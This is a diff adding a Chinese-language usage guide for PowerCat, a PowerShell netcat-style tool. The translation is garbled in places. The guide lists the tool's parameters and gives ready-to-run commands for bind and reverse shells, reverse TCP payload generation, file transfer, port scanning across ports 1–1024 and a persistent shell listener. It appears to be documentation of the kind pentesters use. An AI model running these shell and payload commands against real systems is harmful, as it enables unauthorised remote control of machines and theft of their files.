@@ -1,0 +1,64 @@
+PowerCat是一个的powershell写的TCP / IP瑞士军刀，看一看成NCAT的的powershell的实现，然后里面也加入了众多好用的功能，如文件上传，SMB协议支持，中继模式，生成有效载荷，端口扫描等等。
+
+使用方法
+
+支持的方法如下
+
+Start-PowerCat＃启动监听器/服务器。
+-Mode＃默认为Tcp，也可以指定Udp或Smb。
+-Port＃侦听端口。
+-PipeName＃要监听的管道名称。
+-SslCn＃Ssl加密Tcp的通用名称。
+-Relay＃格式：“<Mode>：<Port / PipeName>”- 
+Execute＃执行控制台进程或powershell。
+-SendFile＃要发送的文件的文件路径。
+-ReceiveFile＃要写入的文件的文件路径。
+-Disconnect＃连接后断开连接。
+-KeepAlive＃断开连接后重新启动。
+- 超时＃超时选项。默认值：60秒
+Connect-PowerCat＃将客户端连接到监听器/服务器。
+-Mode＃默认为Tcp，也可以指定
+要连接的主机的Udp或Smb -RemoteIp＃IPv4地址。
+-Port＃要连接的端口。
+-PipeName＃要连接的管道名称。
+-SslCn＃Ssl加密Tcp的通用名称。
+-Relay＃格式：“<Mode>：<IP>：<Port / PipeName>”- 
+Execute＃执行控制台进程或powershell。
+-SendFile＃要发送的文件的文件路径。
+-ReceiveFile＃要写入的文件的文件路径。
+-Disconnect＃连接后断开连接。
+- 超时＃超时选项。默认值：60秒
+最基础的连接与监听模式：
+
+
+＃Basic Listener：Start-PowerCat -Port 443
+
+＃Basic Client：Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443
+发送与接受文件
+
+＃发送文件：
+Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C：\ pathto \ inputfile
+＃接收文件：
+Start-PowerCat -Port 443 -ReceiveFile C：\ pathto \ outputfile
+正向与反向壳
+
+＃提供一个shell：
+Start-PowerCat -Port 443 -Execute
+＃发一个Shell：
+Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute
+有效载荷生成
+
+＃生成一个反向tcp有效载荷，连接到10.1.1.15端口443：
+New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute
+＃生成侦听端口8000的tcp有效载荷：
+New-PowerCatPayload -Listener -Port 8000 -Execute
+端口扫描
+
+＃基本TCP端口扫描：
+1..1024 | ForEach-Object {Connect-PowerCat -RemoteIp 10.1.1.10 -Port $ _ -Timeout 1 -Verbose -Disconnect}
+＃基本UDP端口扫描：
+1..1024 | ForEach-Object {Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $ _ -Timeout 1 -Verbose}
+＃持久监听器：
+Start-PowerCat -Port 443 -Execute -KeepAlive
+＃简单Web服务器：
+Start-PowerCat -Port 80 -SendFile index.html
